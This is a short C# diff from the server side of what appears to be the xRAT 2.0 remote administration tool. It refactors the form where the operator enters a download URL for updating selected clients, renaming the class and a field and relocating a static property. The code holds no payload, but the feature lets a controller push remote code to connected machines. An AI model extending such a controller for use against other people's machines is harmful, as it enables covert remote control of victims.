@@ -3,33 +3,28 @@ using System.Windows.Forms;
 
 namespace xServer.Forms
 {
-    public partial class frmUpdate : Form
+    public partial class FrmUpdate : Form
     {
-        private int selectedClients;
+        private readonly int _selectedClients;
 
-        public frmUpdate(int selected)
+        public FrmUpdate(int selected)
         {
-            selectedClients = selected;
+            _selectedClients = selected;
             InitializeComponent();
+        }
+
+        private void FrmUpdate_Load(object sender, EventArgs e)
+        {
+            this.Text = string.Format("xRAT 2.0 - Update [Selected: {0}]", _selectedClients);
+            txtURL.Text = Core.Misc.Update.DownloadURL;
         }
 
         private void btnUpdate_Click(object sender, EventArgs e)
         {
-            _Update.DownloadURL = txtURL.Text;
+            Core.Misc.Update.DownloadURL = txtURL.Text;
 
-            this.DialogResult = System.Windows.Forms.DialogResult.OK;
+            this.DialogResult = DialogResult.OK;
             this.Close();
         }
-
-        private void frmUpdate_Load(object sender, EventArgs e)
-        {
-            this.Text = string.Format("xRAT 2.0 - Update [Selected: {0}]", selectedClients);
-            txtURL.Text = _Update.DownloadURL;
-        }
-    }
-
-    public class _Update
-    {
-        public static string DownloadURL { get; set; }
     }
 }
